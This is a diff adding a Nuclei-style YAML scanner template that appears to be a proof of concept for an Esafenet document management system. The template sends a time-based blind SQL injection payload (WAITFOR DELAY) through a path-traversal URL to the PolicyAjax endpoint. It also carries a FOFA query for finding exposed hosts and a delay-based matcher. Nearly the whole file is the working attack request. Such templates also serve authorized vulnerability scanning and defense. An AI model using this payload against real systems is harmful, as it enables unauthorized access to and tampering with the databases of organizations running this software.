@@ -1,0 +1,78 @@
+id: poc-vex4h0pn5qixgt8t
+info:
+  name: 亿赛通电子文档管理系统-policyajax接口SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vex4h0pn5qixgt8t
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: vex4h0pn5qixgt8t
+    fofa: app="亿赛通-电子文档安全管理系统"
+http:
+- raw:
+  - 'POST /CDGServer3/dojojs/../PolicyAjax HTTP/1.1
+
+
+    Cookie: JSESSIONID=0886AB2C8CF7F041586A39EED93C1059
+
+
+    Sec-Ch-Ua: "Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"
+
+
+    Sec-Ch-Ua-Mobile: ?0
+
+
+    Sec-Ch-Ua-Platform: "Windows"
+
+
+    Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
+
+
+    Sec-Fetch-Site: same-origin
+
+
+    Sec-Fetch-Mode: no-cors
+
+
+    Sec-Fetch-Dest: image
+
+
+    Accept-Encoding: gzip, deflate, br
+
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+
+    Connection: close
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+
+
+    command=selectOption&id=-1'';WAITFOR DELAY ''0:0:6''--&type=JMCL
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
